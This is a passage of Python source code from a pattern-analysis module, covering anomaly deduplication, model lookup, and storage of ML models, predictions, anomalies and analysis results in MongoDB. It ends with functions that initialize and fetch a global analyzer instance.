                    unique_anomalies.append(anomaly)
                    seen_features.add(feature_signature)
            
            return unique_anomalies
            
        except Exception as e:
            logger.error(f"Error deduplicating anomalies: {e}")
            return anomalies
    
    def _get_model(self, pattern_type: PatternType, model_type: str):
        """Get trained model"""
        try:
            if pattern_type in self.models and model_type in self.models[pattern_type]:
                return self.models[pattern_type][model_type]
            return None
            
        except Exception as e:
            logger.error(f"Error getting model: {e}")
            return None
    
    def _store_model(self, model: MLModel):
        """Store trained model"""
        try:
            if self.mongodb:
                collection = self.mongodb.ml_models
                doc = asdict(model)
                doc["created_at"] = model.created_at
                doc["last_trained"] = model.last_trained
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing model: {e}")
    
    def _store_prediction(self, prediction: PredictionResult):
        """Store prediction result"""
        try:
            if self.mongodb:
                collection = self.mongodb.ml_predictions
                doc = asdict(prediction)
                doc["timestamp"] = prediction.timestamp
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing prediction: {e}")
    
    def _store_anomaly(self, anomaly: AnomalyDetection):
        """Store anomaly detection result"""
        try:
            if self.mongodb:
                collection = self.mongodb.ml_anomalies
                doc = asdict(anomaly)
                doc["detected_at"] = anomaly.detected_at
                collection.insert_one(doc)
                
        except Exception as e:
            logger.error(f"Error storing anomaly: {e}")
    
    def _store_analysis_results(self, results: Dict[str, Any]):
        """Store pattern analysis results"""
        try:
            if self.mongodb:
                collection = self.mongodb.ml_analysis
                results["stored_at"] = datetime.now(timezone.utc)
                collection.insert_one(results)
                
        except Exception as e:
            logger.error(f"Error storing analysis results: {e}")

# Global pattern analyzer instance
pattern_analyzer = None

def initialize_pattern_analyzer(mongodb_connection=None, redis_client=None) -> PatternAnalyzer:
    """Initialize pattern analyzer"""
    global pattern_analyzer
    pattern_analyzer = PatternAnalyzer(mongodb_connection, redis_client)
    return pattern_analyzer

def get_pattern_analyzer() -> PatternAnalyzer:
    """Get pattern analyzer instance"""
    global pattern_analyzer
    if pattern_analyzer is None:
        pattern_analyzer = PatternAnalyzer()
    return pattern_analyzer
